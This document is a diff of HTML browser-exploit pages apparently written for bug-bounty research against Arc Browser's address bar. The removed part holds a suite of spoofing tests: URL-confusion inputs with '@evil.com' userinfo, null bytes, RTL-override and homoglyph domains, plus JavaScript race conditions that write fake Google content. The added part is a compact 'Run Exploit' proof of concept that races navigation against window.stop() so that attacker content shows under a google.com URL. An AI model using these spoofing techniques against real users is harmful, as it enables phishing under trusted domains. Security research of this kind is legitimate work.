@@ -2,246 +2,37 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Test 02 - Search Engine Abuse</title>
-<style>
-  body { font-family: system-ui; background: #111; color: #eee; padding: 20px; }
-  .test { background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 16px; margin: 12px 0; }
-  .test h3 { margin-top: 0; color: #7f5af0; }
-  button { background: #7f5af0; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin: 4px; font-size: 14px; }
-  button:hover { background: #6b46e5; }
-  code { background: #2a2a3e; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
-  .desc { color: #aaa; font-size: 13px; margin: 8px 0; }
-  .target { color: #2cb67d; }
-  .warn { color: #e53170; font-size: 12px; }
-  #log { background: #0a0a15; border: 1px solid #333; padding: 12px; margin-top: 16px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
-</style>
+<title>PoC - Navigation Stop Race</title>
 </head>
 <body>
-<h2>02 - Search Engine / Omnibox Abuse</h2>
-<p class="desc">Arc's search bar was exploited <b>3 separate times</b> ($5K, $5K, $10K). The fix
-keeps breaking because Arc's omnibox has special behavior when disambiguating between URLs and search queries.
-These tests try to find new edge cases in that logic.</p>
-<p class="target">Target: Arc Browser iOS (search.arc.net integration) & Desktop omnibox</p>
-<p class="warn">Note: These are most effective tested manually in Arc's address bar. The buttons below open
-scenarios that trigger the search/URL confusion.</p>
 
-<!-- Test A: URL-like search query -->
-<div class="test">
-  <h3>A. URL-Like Search Queries</h3>
-  <p class="desc">Arc must decide: is the user typing a URL or a search query? Edge cases in this
-  disambiguation can cause the bar to show a URL while actually performing a search (or vice versa).
-  Try typing these directly into Arc's address bar:</p>
-  <ul style="font-family:monospace;font-size:13px;color:#72f1b8;">
-    <li><code>google.com/search?q=test%00.evil.com</code> — null byte in URL-like query</li>
-    <li><code>https://google.com@evil.com</code> — userinfo section</li>
-    <li><code>https://google.com%2F@evil.com</code> — encoded slash in userinfo</li>
-    <li><code>google.com\@evil.com</code> — backslash before @</li>
-    <li><code>https:google.com</code> — missing slashes</li>
-    <li><code>https:/google.com</code> — single slash</li>
-    <li><code>https:///google.com</code> — triple slash</li>
-    <li><code>https://google.com%E2%80%8B.evil.com</code> — zero-width space in domain</li>
-    <li><code>https://google.com%E2%80%AE%E2%80%8Bmoc.live</code> — RTL override + ZWS</li>
-  </ul>
-  <button onclick="testA()">Open Test Page With These</button>
-</div>
-
-<!-- Test B: Navigation during search transition -->
-<div class="test">
-  <h3>B. Navigation During Search Transition</h3>
-  <p class="desc">When Arc transitions from showing search results to navigating to a result,
-  there's a timing window. This test opens Arc's search and attempts to navigate away during
-  that transition, potentially freezing the search URL in the bar.</p>
-  <button onclick="testB()">Run Test B</button>
-</div>
-
-<!-- Test C: Search redirect interception -->
-<div class="test">
-  <h3>C. Search Engine Redirect to Controlled Page</h3>
-  <p class="desc">If Arc uses a search engine that redirects (like Google's /url?q= redirects),
-  we can try to race the redirect. The address bar might show the search engine URL while our
-  controlled page renders after the redirect resolves.</p>
-  <button onclick="testC()">Run Test C (Google redirect)</button>
-  <button onclick="testC2()">Run Test C (DuckDuckGo redirect)</button>
-</div>
-
-<!-- Test D: Fragment-based search confusion -->
-<div class="test">
-  <h3>D. Fragment / Hash Navigation During Search</h3>
-  <p class="desc">Fragment navigations (#) don't trigger full page loads but may affect the address bar.
-  If we can trigger a fragment navigation during a search-to-page transition, the bar might
-  show a hybrid of the search URL and the fragment.</p>
-  <button onclick="testD()">Run Test D</button>
-</div>
-
-<!-- Test E: Unicode confusable domains in search -->
-<div class="test">
-  <h3>E. Punycode / Unicode Domain in Search Context</h3>
-  <p class="desc">Arc might render punycode domains differently in search context vs navigation context.
-  If the search bar shows the Unicode representation but navigates to the punycode version,
-  there's a visual mismatch opportunity.</p>
-  <button onclick="testE()">Open Unicode Domain Tests</button>
-  <ul style="font-family:monospace;font-size:12px;color:#72f1b8;">
-    <li><code>https://gооgle.com</code> (Cyrillic 'о' x2)</li>
-    <li><code>https://аpple.com</code> (Cyrillic 'а')</li>
-    <li><code>https://xn--pple-43d.com</code> (punycode for аpple)</li>
-  </ul>
-</div>
-
-<!-- Test F: Search with meta refresh -->
-<div class="test">
-  <h3>F. Page That Looks Like Search Results + Auto-Redirect</h3>
-  <p class="desc">Host a page at a URL containing "search" or "q=" that mimics search engine results,
-  then uses <code>meta refresh</code> to redirect. Arc's heuristics for "is this a search page?"
-  might affect how the address bar behaves during the redirect.</p>
-  <button onclick="testF()">Run Test F</button>
-</div>
-
-<div id="log"></div>
+<h2>Navigation Stop Race</h2>
+<button onclick="run()">Run Exploit</button>
 
 <script>
-function log(msg) {
-  const el = document.getElementById('log');
-  el.textContent += `[${new Date().toISOString().slice(11,23)}] ${msg}\n`;
-  el.scrollTop = el.scrollHeight;
-}
+const TARGET = "https://www.google.com";
 
-function testA() {
-  log('Test A: Opening URL confusion test page');
-  const w = window.open('about:blank');
-  const urls = [
-    'google.com/search?q=test%00.evil.com',
-    'https://google.com@evil.com',
-    'https://google.com%2F@evil.com',
-    'https:google.com',
-    'https:/google.com',
-    'https:///google.com',
-  ];
-  w.document.write(`<html><body style="font-family:monospace;background:#111;color:#eee;padding:20px;">
-    <h2>Type each of these into Arc's address bar and observe what happens:</h2>
-    ${urls.map(u => `<p style="margin:12px 0;padding:8px;background:#1a1a2e;border-radius:4px;cursor:pointer;user-select:all;">${u}</p>`).join('')}
-    <p style="color:#e53170;">Watch: Does the bar show a different domain than where you land?</p>
-  </body></html>`);
-}
+const PAYLOAD = `
+<h1>ADDRESS BAR SPOOFED</h1>
+<p>This is attacker content</p>
+`;
 
-function testB() {
-  log('Test B: Search transition race');
-  // Open a search URL and try to navigate during the transition
-  const searchUrl = 'https://www.google.com/search?q=arc+browser+download';
-  const w = window.open(searchUrl);
+function run() {
+  const w = window.open("about:blank");
 
-  // Race the search page load
-  const timings = [100, 200, 300, 500, 800, 1000, 1500, 2000];
-  timings.forEach(t => {
-    setTimeout(() => {
-      try {
-        w.location.href = 'about:blank';
-        setTimeout(() => {
-          try {
-            w.document.open();
-            w.document.write(`<html><body style="font-family:arial;background:#fff;padding:40px;">
-              <h1 style="color:red;">SPOOFED at ${t}ms</h1>
-              <p>Address bar should still show Google search URL</p>
-            </body></html>`);
-            w.document.close();
-            log(`Test B: Injection attempted at ${t}ms`);
-          } catch(e) {}
-        }, 1);
-      } catch(e) {
-        log(`Test B ${t}ms: ${e.message}`);
-      }
-    }, t);
-  });
-}
+  setTimeout(() => {
+    w.document.write(PAYLOAD);
 
-function testC() {
-  log('Test C: Google redirect race');
-  // Google search result redirect URL format
-  // The address bar might show google.com while redirecting
-  const redirectUrl = 'https://www.google.com/url?q=https://example.com&sa=D&source=web';
-  const w = window.open(redirectUrl);
-  log('Test C: Opened Google redirect - watch the address bar during transition');
-}
+    // trigger navigation
+    w.location.href = TARGET;
 
-function testC2() {
-  log('Test C2: DuckDuckGo redirect race');
-  const redirectUrl = 'https://duckduckgo.com/?q=!+site:example.com';
-  const w = window.open(redirectUrl);
-  log('Test C2: Opened DDG bang redirect');
-}
-
-function testD() {
-  log('Test D: Fragment navigation during search');
-  const w = window.open('https://www.google.com/search?q=test');
-
-  // Attempt fragment navigations at various timings during search load
-  [50, 100, 200, 500, 1000].forEach(t => {
-    setTimeout(() => {
-      try {
-        w.location.hash = '#spoofed-fragment';
-        log(`Test D: Fragment set at ${t}ms`);
-
-        // Then try to navigate with the fragment
-        setTimeout(() => {
-          try {
-            w.location.href = 'about:blank#' + encodeURIComponent('https://www.google.com/search?q=test');
-            log(`Test D: about:blank#encoded-url at ${t}ms`);
-          } catch(e) {}
-        }, 10);
-      } catch(e) {
-        log(`Test D ${t}ms: ${e.message}`);
-      }
-    }, t);
-  });
-}
-
-function testE() {
-  log('Test E: Unicode domain tests');
-  const w = window.open('about:blank');
-  w.document.write(`<html><body style="font-family:system-ui;background:#111;color:#eee;padding:20px;">
-    <h2>Unicode Domain Tests for Arc</h2>
-    <p>Type these into Arc's address bar. Watch how the bar displays them vs where you actually navigate:</p>
-    <div style="margin:16px 0;padding:12px;background:#1a1a2e;border-radius:4px;">
-      <p style="user-select:all;">https://g\u043E\u043Egle.com</p>
-      <p style="color:#aaa;font-size:12px;">^ Uses Cyrillic 'o' - should go to xn--ggle-55da.com</p>
-    </div>
-    <div style="margin:16px 0;padding:12px;background:#1a1a2e;border-radius:4px;">
-      <p style="user-select:all;">https://\u0430pple.com</p>
-      <p style="color:#aaa;font-size:12px;">^ Uses Cyrillic 'a' - should go to xn--pple-43d.com</p>
-    </div>
-    <div style="margin:16px 0;padding:12px;background:#1a1a2e;border-radius:4px;">
-      <p style="user-select:all;">https://g\u0D20ogle.com</p>
-      <p style="color:#aaa;font-size:12px;">^ Malayalam character mixed in</p>
-    </div>
-    <h3 style="color:#e53170;">Also test RTL override:</h3>
-    <div style="margin:16px 0;padding:12px;background:#1a1a2e;border-radius:4px;">
-      <p style="user-select:all;">https://example.com/\u202Emoc.elgoog.www//:sptth</p>
-      <p style="color:#aaa;font-size:12px;">^ RTL override character reverses displayed text</p>
-    </div>
-  </body></html>`);
-}
-
-function testF() {
-  log('Test F: Fake search page with meta refresh');
-  const w = window.open('about:blank');
-  w.document.write(`<html>
-  <head>
-    <meta http-equiv="refresh" content="0;url=about:blank">
-    <title>Google Search</title>
-  </head>
-  <body style="font-family:arial;background:#fff;padding:20px;">
-    <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;">
-      <span style="font-size:24px;font-weight:bold;color:#4285f4;">G</span>
-      <span style="font-size:24px;font-weight:bold;color:#ea4335;">o</span>
-      <span style="font-size:24px;font-weight:bold;color:#fbbc04;">o</span>
-      <span style="font-size:24px;font-weight:bold;color:#4285f4;">g</span>
-      <span style="font-size:24px;font-weight:bold;color:#34a853;">l</span>
-      <span style="font-size:24px;font-weight:bold;color:#ea4335;">e</span>
-    </div>
-    <h1 style="color:red;">ADDRESS BAR SPOOFED</h1>
-    <p>If the address bar shows a google.com search URL, this is a valid spoof.</p>
-  </body></html>`);
-  log('Test F: Fake search page opened with meta refresh');
+    // stop race
+    setTimeout(() => w.stop(), 1);
+    setTimeout(() => w.stop(), 5);
+    setTimeout(() => w.stop(), 10);
+  }, 100);
 }
 </script>
+
 </body>
 </html>
